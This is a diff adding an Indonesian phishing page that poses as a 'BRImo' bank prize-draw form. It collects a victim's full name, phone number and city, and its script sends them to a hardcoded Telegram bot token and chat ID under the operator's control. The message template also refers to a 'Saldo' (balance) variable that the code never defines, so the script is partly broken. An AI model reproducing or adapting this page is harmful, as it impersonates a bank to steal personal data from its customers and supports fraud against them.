@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Form Undian</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 20px;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh; /* Agar form di tengah halaman */
+    }
+    form {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      max-width: 450px;
+      width: 100%;
+      box-sizing: border-box; /* Include padding in width calculation */
+    }
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 25px;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #555;
+    }
+    input[type="text"] {
+      width: calc(100% - 24px); /* Full width minus padding and border */
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    input[type="text"]:focus {
+      border-color: #007bff;
+      outline: none;
+      box-shadow: 0 0 5px rgba(0, 123, 255, 0.25);
+    }
+    button[type="submit"] {
+      background-color: #007bff;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 18px;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+    button[type="submit"]:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <form id="formUndian">
+    <h2>Form Undian Hadiah BRImo</h2>
+    <label for="nama">Nama Lengkap:</label><br>
+    <input type="text" id="nama" name="nama" required placeholder="Masukkan nama Anda"><br>
+
+    <label for="hp">Nomor HP:</label><br>
+    <input type="text" id="hp" name="hp" required placeholder="Contoh: 081234567890"><br>
+
+    <label for="kota">Kota Domisili:</label><br>
+    <input type="text" id="kota" name="kota" required placeholder="Masukkan kota Anda"><br>
+
+    <button type="submit">Kirim Data Undian</button>
+  </form>
+
+  <script>
+    // PASTIKAN TOKEN DAN CHAT ID INI SUDAH BENAR!
+    const TELEGRAM_BOT_TOKEN = "7567570626:AAG9I5tBmabqS1KYjDYkr3WzNkbHBU2nczU";
+    const TELEGRAM_CHAT_ID = "5373308355";
+
+    document.getElementById("formUndian").addEventListener("submit", function(e) {
+      e.preventDefault(); // Mencegah form untuk refresh halaman
+
+      const nama = document.getElementById("nama").value.trim(); // .trim() untuk menghapus spasi di awal/akhir
+      const hp = document.getElementById("hp").value.trim();
+      const kota = document.getElementById("kota").value.trim();
+
+      // Validasi sederhana: pastikan semua field terisi
+      if (!nama || !hp || !kota) {
+        alert("Mohon lengkapi semua data sebelum mengirim!");
+        return; // Hentikan eksekusi jika ada field kosong
+      }
+
+      // Format pesan yang akan dikirim ke Telegram
+      const pesan = `
+📥 *Form Undian BRImo*
+------------------------------
+👤 *Nama:* ${nama}
+📱 *No. HP:* ${hp}
+🏙️ *Saldo:* ${saldo}
+------------------------------
+`; // Format pesan lebih rapi
+
+      // Mengirim data menggunakan Fetch API ke Telegram Bot API
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: pesan,
+          parse_mode: "Markdown" // Menggunakan Markdown untuk format teks
+        })
+      })
+      .then(response => {
+        if (response.ok) { // Memastikan respons dari API sukses (status 2xx)
+          alert("✅ Data undian berhasil dikirim ke Telegram!");
+          document.getElementById("formUndian").reset(); // Mengosongkan form setelah berhasil
+        } else {
+          // Tangani error jika respons tidak OK
+          return response.json().then(errorData => {
+            console.error("❌ Gagal mengirim data ke Telegram:", errorData);
+            alert(`⚠️ Gagal mengirim data. Silakan coba lagi. (Error: ${errorData.description || 'Tidak diketahui'})`);
+          });
+        }
+      })
+      .catch(error => {
+        // Tangani error jaringan atau lainnya
+        console.error("❗ Terjadi kesalahan jaringan:", error);
+        alert("❗ Terjadi kesalahan saat mengirim data. Pastikan koneksi internet Anda stabil.");
+      });
+    });
+  </script>
+</body>
+</html>
